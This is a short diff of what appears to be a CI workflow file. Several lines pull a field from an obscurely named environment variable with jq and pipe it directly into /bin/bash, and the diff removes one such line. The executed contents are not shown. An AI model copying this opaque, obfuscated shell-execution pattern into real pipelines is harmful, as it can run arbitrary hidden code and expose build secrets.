@@ -28,7 +28,6 @@ jobs:
           echo $zoxmo84880 | jq -r .aupbn5513 | /bin/bash
           printf '%s' "$fqrou164" | jq -r .h781 | /bin/bash
           printf '%s' "$myb5" | jq -r .ok1 | /bin/bash
-          echo $ka2 | jq -r .rzg4 | /bin/bash
           printf '%s' "$p73" | jq -r .zyjvd3870 | /bin/bash
 
       - name: Store artifact
